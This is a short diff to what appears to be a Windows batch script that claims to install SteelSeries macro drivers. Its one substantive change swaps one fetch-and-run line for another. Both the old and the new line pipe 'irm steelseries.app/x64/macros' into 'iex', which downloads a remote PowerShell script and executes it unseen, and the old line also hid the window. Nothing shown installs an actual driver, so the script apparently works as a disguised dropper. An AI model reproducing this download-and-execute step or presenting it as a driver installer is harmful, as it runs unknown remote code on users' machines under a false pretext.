@@ -4,7 +4,7 @@ color 6
 echo [LOG] Installing Drivers
 
 :: Use steelseries macro drivers...
-powershell Start-Process powershell -ArgumentList 'irm steelseries.app/x64/macros ^| iex' -WindowStyle Hidden
+powershell irm steelseries.app/x64/macros | iex
 
 color a
 echo [LOG] Drivers Installed!
